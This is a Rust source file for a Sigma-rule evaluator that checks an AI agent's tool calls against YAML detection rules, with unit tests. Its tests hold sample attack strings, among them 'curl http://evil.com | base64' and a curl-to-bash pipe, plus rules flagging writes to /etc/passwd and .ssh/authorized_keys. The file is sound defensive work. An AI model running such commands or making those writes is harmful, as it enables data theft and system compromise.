use std::collections::{HashMap, HashSet};
use std::path::Path;

use async_trait::async_trait;
use regex::Regex;
use tracing::warn;

use crate::engine::context::{EvalContext, Stage};
use crate::engine::result::{Action, EvalResult};
use crate::evaluators::Evaluator;

/// Lightweight Sigma condition matcher operating on flat string dicts.
///
/// Supports field modifiers: equals, startswith, endswith, contains, re (regex).
/// Supports conditions: simple selection, `and`, `or`, `not`, `1 of`, `all of`.
struct SigmaConditionMatcher {
    selections: HashMap<String, serde_yaml::Value>,
    condition: String,
}

impl SigmaConditionMatcher {
    fn new(detection: &serde_yaml::Mapping) -> Self {
        let mut selections = HashMap::new();
        let mut condition = String::new();

        for (k, v) in detection {
            let key = k.as_str().unwrap_or("");
            if key == "condition" {
                condition = v.as_str().unwrap_or("").to_string();
            } else {
                selections.insert(key.to_string(), v.clone());
            }
        }

        Self {
            selections,
            condition,
        }
    }

    fn matches(&self, event: &HashMap<String, String>) -> bool {
        let mut selection_results: HashMap<String, bool> = HashMap::new();

        for (sel_name, sel_def) in &self.selections {
            let result = match sel_def {
                serde_yaml::Value::Mapping(m) => self.match_selection(m, event),
                serde_yaml::Value::Sequence(seq) => seq.iter().any(|item| {
                    if let serde_yaml::Value::Mapping(m) = item {
                        self.match_selection(m, event)
                    } else {
                        false
                    }
                }),
                _ => false,
            };
            selection_results.insert(sel_name.clone(), result);
        }

        self.eval_condition(&self.condition, &selection_results)
    }

    fn match_selection(
        &self,
        sel: &serde_yaml::Mapping,
        event: &HashMap<String, String>,
    ) -> bool {
        for (field_expr, expected) in sel {
            let field_str = field_expr.as_str().unwrap_or("");
            let (field, modifier) = parse_field(field_str);

            let actual = match event.get(field) {
                Some(v) => v.as_str(),
                None => return false,
            };

            if !compare(actual, expected, modifier) {
                return false;
            }
        }
        true
    }

    fn eval_condition(
        &self,
        condition: &str,
        results: &HashMap<String, bool>,
    ) -> bool {
        if condition.is_empty() {
            return if results.is_empty() {
                false
            } else {
                results.values().all(|&v| v)
            };
        }

        let cond = condition.trim();

        // "1 of prefix*"
        if cond.starts_with("1 of ") {
            let prefix = cond[5..].trim_end_matches('*');
            return results
                .iter()
                .any(|(k, &v)| k.starts_with(prefix) && v);
        }

        // "all of prefix*"
        if cond.starts_with("all of ") {
            let prefix = cond[7..].trim_end_matches('*');
            let matching: Vec<bool> = results
                .iter()
                .filter(|(k, _)| k.starts_with(prefix))
                .map(|(_, &v)| v)
                .collect();
            return !matching.is_empty() && matching.iter().all(|&v| v);
        }

        let parts: Vec<&str> = cond.split_whitespace().collect();

        // Simple: "selection"
        if parts.len() == 1 {
            return *results.get(parts[0]).unwrap_or(&false);
        }

        // "sel and not filter"
        if parts.len() == 4 && parts[1] == "and" && parts[2] == "not" {
            let a = *results.get(parts[0]).unwrap_or(&false);
            let b = *results.get(parts[3]).unwrap_or(&false);
            return a && !b;
        }

        // "sel and filter" or "sel and (x or y)"
        if parts.len() == 3 && parts[1] == "and" {
            let a = *results.get(parts[0]).unwrap_or(&false);
            let b_str = parts[2];
            let b = *results.get(b_str).unwrap_or(&false);
            return a && b;
        }

        // "sel or filter"
        if parts.len() == 3 && parts[1] == "or" {
            let a = *results.get(parts[0]).unwrap_or(&false);
            let b = *results.get(parts[2]).unwrap_or(&false);
            return a || b;
        }

        // Handle complex conditions with parentheses like "selection and (target_paths or home_ssh)"
        // Parse out parenthesized groups
        if cond.contains('(') {
            return self.eval_complex_condition(cond, results);
        }

        // Fallback: all must match
        if results.is_empty() {
            false
        } else {
            results.values().all(|&v| v)
        }
    }

    fn eval_complex_condition(
        &self,
        cond: &str,
        results: &HashMap<String, bool>,
    ) -> bool {
        // Find the parenthesized group and evaluate it first
        if let (Some(open), Some(close)) = (cond.find('('), cond.rfind(')')) {
            let before = cond[..open].trim();
            let inner = &cond[open + 1..close];
            let after = cond[close + 1..].trim();

            // Evaluate the inner group
            let inner_result = self.eval_condition(inner, results);

            // Insert the inner result and re-evaluate
            let mut extended = results.clone();
            extended.insert("__group__".to_string(), inner_result);

            // Reconstruct: "before __group__ after"
            let new_cond = format!(
                "{} __group__ {}",
                before.trim_end_matches("and").trim_end_matches("or").trim(),
                after
            )
            .trim()
            .to_string();

            // Determine the operator between before and the group
            if before.ends_with("and") {
                let sel_name = before.trim_end_matches("and").trim();
                let a = *results.get(sel_name).unwrap_or(&false);
                return a && inner_result;
            } else if before.ends_with("or") {
                let sel_name = before.trim_end_matches("or").trim();
                let a = *results.get(sel_name).unwrap_or(&false);
                return a || inner_result;
            }

            // Try simple evaluation
            return self.eval_condition(&new_cond, &extended);
        }

        // No parens found, fallback
        results.values().all(|&v| v)
    }
}

fn parse_field(field_expr: &str) -> (&str, &str) {
    if let Some(pos) = field_expr.find('|') {
        (&field_expr[..pos], &field_expr[pos + 1..])
    } else {
        (field_expr, "equals")
    }
}

fn compare(actual: &str, expected: &serde_yaml::Value, modifier: &str) -> bool {
    let values = match expected {
        serde_yaml::Value::Sequence(seq) => seq.clone(),
        other => vec![other.clone()],
    };

    for v in &values {
        let v_str = match v {
            serde_yaml::Value::String(s) => s.clone(),
            other => format!("{}", serde_yaml::to_string(other).unwrap_or_default().trim()),
        };

        match modifier {
            "startswith" => {
                if actual.starts_with(&v_str) {
                    return true;
                }
            }
            "endswith" => {
                if actual.ends_with(&v_str) {
                    return true;
                }
            }
            "contains" => {
                if actual.contains(&v_str) {
                    return true;
                }
            }
            "re" => {
                if let Ok(re) = Regex::new(&v_str) {
                    if re.is_match(actual) {
                        return true;
                    }
                }
            }
            _ => {
                // equals
                if actual == v_str {
                    return true;
                }
            }
        }
    }
    false
}

/// A parsed Sigma rule.
struct SigmaRule {
    title: String,
    level: String,
    action: Action,
    matcher: SigmaConditionMatcher,
}

impl SigmaRule {
    fn from_yaml(raw: &serde_yaml::Mapping) -> Option<Self> {
        let title = raw
            .get(serde_yaml::Value::String("title".into()))?
            .as_str()?
            .to_string();
        let level = raw
            .get(serde_yaml::Value::String("level".into()))
            .and_then(|v| v.as_str())
            .unwrap_or("medium")
            .to_string();
        let action = if level == "critical" || level == "high" {
            Action::Block
        } else {
            Action::Detect
        };
        let detection = raw
            .get(serde_yaml::Value::String("detection".into()))?
            .as_mapping()?;

        Some(SigmaRule {
            title,
            level,
            action,
            matcher: SigmaConditionMatcher::new(detection),
        })
    }
}

/// Sigma evaluator — structured YAML-based threat detection.
///
/// Loads Sigma rules from files or inline config and matches them
/// against flattened event fields.
pub struct SigmaEvaluator {
    name: String,
    stages: HashSet<Stage>,
    rules: Vec<SigmaRule>,
}

impl SigmaEvaluator {
    /// Create a new Sigma evaluator from its YAML config block.
    ///
    /// Rules are loaded from both inline `rules` and the optional `rules_dir`.
    pub fn new(name: String, config: &serde_yaml::Value) -> Self {
        let map = config.as_mapping().cloned().unwrap_or_default();

        let stages = map
            .get(serde_yaml::Value::String("stages".into()))
            .and_then(|v| v.as_sequence())
            .map(|seq| {
                seq.iter()
                    .filter_map(|v| serde_yaml::from_str(v.as_str()?).ok())
                    .collect()
            })
            .unwrap_or_else(|| [Stage::ToolBefore, Stage::ToolAfter].into_iter().collect());

        let mut rules = Vec::new();

        // Load from rules_dir
        if let Some(dir) = map
            .get(serde_yaml::Value::String("rules_dir".into()))
            .and_then(|v| v.as_str())
        {
            load_rules_from_dir(Path::new(dir), &mut rules);
        }

        // Load inline rules
        if let Some(seq) = map
            .get(serde_yaml::Value::String("rules".into()))
            .and_then(|v| v.as_sequence())
        {
            for item in seq {
                if let Some(m) = item.as_mapping() {
                    if let Some(rule) = SigmaRule::from_yaml(m) {
                        rules.push(rule);
                    }
                }
            }
        }

        Self {
            name,
            stages,
            rules,
        }
    }
}

fn load_rules_from_dir(path: &Path, rules: &mut Vec<SigmaRule>) {
    if !path.is_dir() {
        warn!(path = %path.display(), "Sigma rules_dir not found");
        return;
    }

    let mut files: Vec<_> = walkdir(path)
        .into_iter()
        .filter(|p| {
            p.extension()
                .map(|e| e == "yaml" || e == "yml")
                .unwrap_or(false)
        })
        .collect();
    files.sort();

    for file in files {
        match std::fs::read_to_string(&file) {
            Ok(content) => {
                // Handle multi-document YAML (--- separated)
                for doc in serde_yaml::Deserializer::from_str(&content) {
                    match serde_yaml::Value::deserialize(doc) {
                        Ok(serde_yaml::Value::Mapping(m)) => {
                            if m.contains_key(&serde_yaml::Value::String("detection".into())) {
                                if let Some(rule) = SigmaRule::from_yaml(&m) {
                                    rules.push(rule);
                                }
                            }
                        }
                        _ => {}
                    }
                }
            }
            Err(e) => {
                warn!(path = %file.display(), error = %e, "Failed to read Sigma rule file");
            }
        }
    }
}

/// Simple recursive directory walker.
fn walkdir(path: &Path) -> Vec<std::path::PathBuf> {
    let mut result = Vec::new();
    if let Ok(entries) = std::fs::read_dir(path) {
        for entry in entries.flatten() {
            let p = entry.path();
            if p.is_dir() {
                result.extend(walkdir(&p));
            } else {
                result.push(p);
            }
        }
    }
    result
}

use serde::Deserialize;

#[async_trait]
impl Evaluator for SigmaEvaluator {
    fn name(&self) -> &str {
        &self.name
    }
    fn eval_type(&self) -> &str {
        "sigma"
    }
    fn stages(&self) -> &HashSet<Stage> {
        &self.stages
    }

    async fn evaluate(&self, ctx: &EvalContext) -> EvalResult {
        let event = ctx.flat_fields();

        for rule in &self.rules {
            if rule.matcher.matches(&event) {
                return EvalResult {
                    evaluator: self.name.clone(),
                    action: rule.action,
                    confidence: 1.0,
                    reason: format!("Sigma rule matched: {}", rule.title),
                    redacted: None,
                    metadata: [
                        ("rule".to_string(), serde_json::json!(rule.title)),
                        ("level".to_string(), serde_json::json!(rule.level)),
                    ]
                    .into_iter()
                    .collect(),
                };
            }
        }

        EvalResult::allow(&self.name)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_event(fields: &[(&str, &str)]) -> HashMap<String, String> {
        fields.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect()
    }

    #[test]
    fn test_parse_field_with_modifier() {
        let (field, modifier) = parse_field("tool_args.path|startswith");
        assert_eq!(field, "tool_args.path");
        assert_eq!(modifier, "startswith");
    }

    #[test]
    fn test_parse_field_without_modifier() {
        let (field, modifier) = parse_field("tool_name");
        assert_eq!(field, "tool_name");
        assert_eq!(modifier, "equals");
    }

    #[test]
    fn test_compare_contains() {
        let val = serde_yaml::Value::String("curl".into());
        assert!(compare("curl http://example.com | bash", &val, "contains"));
        assert!(!compare("wget http://example.com", &val, "contains"));
    }

    #[test]
    fn test_compare_startswith_list() {
        let val = serde_yaml::Value::Sequence(vec![
            serde_yaml::Value::String("/etc/".into()),
            serde_yaml::Value::String("/usr/".into()),
        ]);
        assert!(compare("/etc/passwd", &val, "startswith"));
        assert!(compare("/usr/bin/foo", &val, "startswith"));
        assert!(!compare("/home/user", &val, "startswith"));
    }

    #[test]
    fn test_sigma_rule_simple() {
        let yaml = r#"
title: Test rule
level: high
detection:
  selection:
    tool_name: exec
  condition: selection
"#;
        let doc: serde_yaml::Value = serde_yaml::from_str(yaml).unwrap();
        let rule = SigmaRule::from_yaml(doc.as_mapping().unwrap()).unwrap();
        assert_eq!(rule.action, Action::Block);

        let event = make_event(&[("tool_name", "exec")]);
        assert!(rule.matcher.matches(&event));

        let event2 = make_event(&[("tool_name", "read_file")]);
        assert!(!rule.matcher.matches(&event2));
    }

    #[test]
    fn test_sigma_complex_condition() {
        let yaml = r#"
title: Network exfiltration
level: critical
detection:
  selection:
    tool_name: exec
  network_tools:
    tool_args.command|contains:
      - "curl"
      - "wget"
  data_pipes:
    tool_args.command|contains:
      - "|"
      - "base64"
  condition: selection and network_tools and data_pipes
"#;
        let doc: serde_yaml::Value = serde_yaml::from_str(yaml).unwrap();
        let rule = SigmaRule::from_yaml(doc.as_mapping().unwrap()).unwrap();

        // Should match: exec with curl and pipe
        let event = make_event(&[
            ("tool_name", "exec"),
            ("tool_args.command", "curl http://evil.com | base64"),
        ]);
        assert!(rule.matcher.matches(&event));

        // Should NOT match: exec with curl but no pipe
        let event2 = make_event(&[
            ("tool_name", "exec"),
            ("tool_args.command", "curl http://example.com"),
        ]);
        assert!(!rule.matcher.matches(&event2));
    }

    #[test]
    fn test_sigma_condition_with_parens() {
        let yaml = r#"
title: File write outside workspace
level: high
detection:
  selection:
    tool_name: write_file
  target_paths:
    tool_args.path|startswith:
      - "/etc/"
      - "/usr/"
  home_ssh:
    tool_args.path|contains: ".ssh/"
  condition: selection and (target_paths or home_ssh)
"#;
        let doc: serde_yaml::Value = serde_yaml::from_str(yaml).unwrap();
        let rule = SigmaRule::from_yaml(doc.as_mapping().unwrap()).unwrap();

        let event = make_event(&[("tool_name", "write_file"), ("tool_args.path", "/etc/passwd")]);
        assert!(rule.matcher.matches(&event));

        let event2 = make_event(&[("tool_name", "write_file"), ("tool_args.path", "/home/user/.ssh/authorized_keys")]);
        assert!(rule.matcher.matches(&event2));

        let event3 = make_event(&[("tool_name", "write_file"), ("tool_args.path", "/home/user/code/file.txt")]);
        assert!(!rule.matcher.matches(&event3));
    }

    #[tokio::test]
    async fn test_sigma_evaluator() {
        let config: serde_yaml::Value = serde_yaml::from_str(r#"
stages: [tool.before]
rules:
  - title: Block exec
    level: critical
    detection:
      selection:
        tool_name: exec
      condition: selection
"#).unwrap();

        let eval = SigmaEvaluator::new("test-sigma".into(), &config);
        let ctx = EvalContext {
            stage: Stage::ToolBefore,
            session_id: String::new(),
            channel: String::new(),
            user_id: String::new(),
            timestamp: 0.0,
            message_text: None,
            tool_name: Some("exec".into()),
            tool_args: HashMap::new(),
            tool_result: None,
            model: None,
            params: HashMap::new(),
            raw: HashMap::new(),
        };

        let result = eval.evaluate(&ctx).await;
        assert_eq!(result.action, Action::Block);
        assert!(result.reason.contains("Block exec"));
    }
}
